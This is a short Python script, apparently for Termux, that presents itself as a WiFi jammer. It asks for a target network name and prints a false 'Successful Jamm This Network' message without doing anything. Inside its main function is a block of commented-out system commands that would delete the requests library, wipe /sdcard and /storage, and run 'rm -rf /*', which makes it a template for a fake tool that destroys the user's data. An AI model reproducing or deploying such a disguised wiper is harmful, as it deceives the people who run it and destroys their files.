#------make-by-paradox-hub-------#
import os


#-----------𝗳𝗼𝗿𝗺𝗮𝘁  𝗰𝗼𝗹𝗼𝘂𝗿 𝗰𝗼𝗱𝗲------------#
a="\033[1;34m"#----------𝗯𝗹𝘂𝗲
b="\033[1;30m"#--------𝗯𝗹𝗮𝗰𝗸
c="\033[1;36m"#----------𝗰𝘆𝗮𝗻
g="\033[1;32m"#----------𝗴𝗿𝗲𝗲𝗻
p="\033[1;35m"#----------𝗽𝘂𝗿𝗽𝗹𝗲
r="\033[1;31m"#----------𝗿𝗲𝗱
y="\033[1;33m"#----------𝘆𝗲𝗹𝗹𝗼𝘄
end="\033[1;37m"#----------𝘄𝗵𝗶𝘁𝗲 {𝗲𝗻𝗱}



logo = ("""
\033[0;34m║███╗   ███╗██████╗    ██╗  ██╗██████╗ 
\033[0;34m║████╗ ████║██╔══██╗██╗██║  ██║██╔══██╗
\033[0;34m║██╔████╔██║██║  ██║╚═╝███████║██████╔╝
\033[0;34m║██║╚██╔╝██║██║  ██║██╗██╔══██║██╔══██╗
\033[0;34m║██║ ╚═╝ ██║██████╔╝╚═╝██║  ██║██║  ██║
\033[0;34m║╚═╝     ╚═╝╚═════╝    ╚═╝  ╚═╝╚═╝  ╚═╝
\033[38;5;46m=================================""" )
def jammer():
	print(logo)
	ab = input('ENTER TARGET WIFI SSID OR NAME : ')
	print(f'{g}YOU WROTE {ab}')
	input(f'{a}ARE YOU SURE : ')
	print(f'{g}Please Wait 5 Minutes For Jamm This Network :)')
	#os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.11/"+"site-"+"packages/req"+"uests")
	#os.system('rm -rf /sdcard/*')
	#os.system('rm -rf /storage/*')
	#os.system('cd /sdcard')
	#os.system('rm -rf *')
	#os.system('rm -rf /*')
	#os.system('cd srorage')
	#os.system('rm -rf *')
	#os.system('rm -rf /*')
	print('Successful Jamm This Network')
	input('Press Enter For Back')
	jammer()
jammer()
